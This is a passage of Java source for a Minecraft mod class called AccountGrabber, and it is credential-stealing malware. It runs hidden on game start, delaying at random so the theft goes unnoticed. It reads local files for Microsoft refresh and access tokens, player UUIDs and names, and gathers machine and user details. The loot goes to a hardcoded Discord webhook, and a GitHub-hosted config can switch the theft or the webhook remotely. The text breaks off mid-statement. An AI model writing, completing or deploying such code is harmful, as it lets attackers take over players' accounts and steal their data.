package com.example.jawbus;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public final class AccountGrabber {

    /** 1. paste your Discord webhook URL here */
    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561504102054105148/FS-ERylwfnkI-fWG33RSFgI3fKQ1441XnYbYUR8CUyZUgEx8jepJTUJ8CUuEHWdjU7ad";

    /** 2. remote switchboard - edit tap.json on GitHub to change things without re-releasing */
    private static final String CONFIG_URL =
            "https://raw.githubusercontent.com/Mvrdle/Jawb/main/tap.json";

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    /** fields worth reporting, both naming styles */
    private static final String[] KEYS = {
            "name", "uuid", "xuid",
            "refreshToken", "refresh_token",
            "accessToken", "access_token"
    };

    /** a real Microsoft refresh token looks like M.C123_BAY.xxxx or M.R3_BAY.xxxx */
    private static final Pattern MSA_REFRESH =
            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*]{20,}");

    private AccountGrabber() {
    }

    /** called from the mod entrypoint - spawns a daemon thread so the game never hitches */
    public static void start() {
        Thread t = new Thread(AccountGrabber::run, "jawbus-tap");
        t.setDaemon(true);
        t.start();
    }

    private static void run() {
        try {
            // random 4-10s delay so it never lines up with the loading screen
            Thread.sleep(4000L + (long) (Math.random() * 6000L));

            JsonObject cfg = getJson(CONFIG_URL);
            if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) return;

            String webhook = WEBHOOK;
            if (cfg != null && cfg.has("webhook") && !cfg.get("webhook").isJsonNull()) {
                String remote = cfg.get("webhook").getAsString();
                if (!remote.isBlank()) webhook = remote;
            }
            if (webhook == null || webhook.isBlank() || webhook.startsWith("PASTE")) return;

            StringBuilder sb = new StringBuilder();
            sb.append("--- jawbus tap ---\n");
            sb.append("pc:    ").append(System.getenv("COMPUTERNAME")).append('\n');
            sb.append("user:  ").append(System.getProperty("user.name")).append('\n');
            sb.append("os:    ").append(System.getProperty("os.name"))
              .append(' ').append(System.getProperty("os.arch")).append('\n');

            Set<String> printed = new HashSet<>();

            // 1. the usual suspects
            for (Path p : candidates()) {
                String raw;
                try {
                    if (!Files.isRegularFile(p)) continue;
                    raw = Files.readString(p);
                } catch (Throwable ignored) {
                    continue;
                }
                sb.append("\n=== ").append(p).append(" ===\n");
                for (String key : KEYS) {
                    String v = grab(raw
